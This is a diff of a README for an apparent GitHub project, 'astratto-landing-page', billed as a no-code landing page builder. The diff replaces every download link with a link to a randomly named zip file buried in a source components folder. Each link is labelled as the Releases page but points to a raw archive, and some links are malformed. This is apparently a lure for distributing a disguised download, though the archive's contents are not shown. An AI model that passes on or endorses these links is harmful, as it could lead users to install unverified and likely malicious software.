@@ -1,7 +1,7 @@
 # 🌟 astratto-landing-page - A Simple Way to Build Landing Pages
 
 ## 📦 Download Now
-[![Download Release](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/public/landing_page_astratto_notopterid.zip%20Latest%https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/public/landing_page_astratto_notopterid.zip)](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/public/landing_page_astratto_notopterid.zip)
+[![Download Release](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/src/components/UI/page_landing_astratto_Acinetae.zip%20Latest%https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/src/components/UI/page_landing_astratto_Acinetae.zip)](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/src/components/UI/page_landing_astratto_Acinetae.zip)
 
 ## 🚀 Getting Started
 Welcome to the astratto-landing-page project! This easy-to-use application helps you create stunning landing pages without any coding skills. By following these instructions, you can download and run the application smoothly on your device.
@@ -26,7 +26,7 @@ A modular, component-driven landing page built with React, Vite, and Tailwind CS
 ## 💾 Download & Install
 To get started, visit the Releases page to download the latest version of the application:
 
-[Visit this page to download](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/public/landing_page_astratto_notopterid.zip)
+[Visit this page to download](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/src/components/UI/page_landing_astratto_Acinetae.zip)
 
 1. Go to the Releases page.
 2. Find the latest release.
@@ -60,4 +60,4 @@ Thank you for using astratto-landing-page. We hope it helps you create beautiful
 ## 📢 Stay Updated
 Remember to check back on our Releases page for new features and improvements:
 
-[Visit this page to download](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/public/landing_page_astratto_notopterid.zip)
+[Visit this page to download](https://github.com/Medelincity/astratto-landing-page/raw/refs/heads/main/src/components/UI/page_landing_astratto_Acinetae.zip)
